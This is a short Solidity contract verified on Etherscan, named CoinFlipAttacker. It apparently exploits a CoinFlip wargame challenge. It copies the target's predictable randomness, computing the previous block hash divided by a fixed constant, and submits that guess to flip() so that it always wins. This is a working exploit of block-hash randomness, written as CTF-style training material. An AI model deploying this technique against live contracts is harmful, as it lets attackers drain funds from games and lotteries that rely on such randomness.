/**
 *Submitted for verification at Etherscan.io on 2022-05-21
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.7.3;

interface ICoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
    function setBlockValue(uint256 _blockValue) external returns (bool);
}

contract CoinFlipAttacker {

    ICoinFlipChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = ICoinFlipChallenge(challengeAddress);
    }

    function attack() external payable {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        // call challenge contract with same guess
        challenge.flip(side);
    }

    function blockValue() external payable {
        uint256 currBlockValue = uint256(blockhash(block.number - 1));
        challenge.setBlockValue(currBlockValue);
    }

    receive() external payable {}

}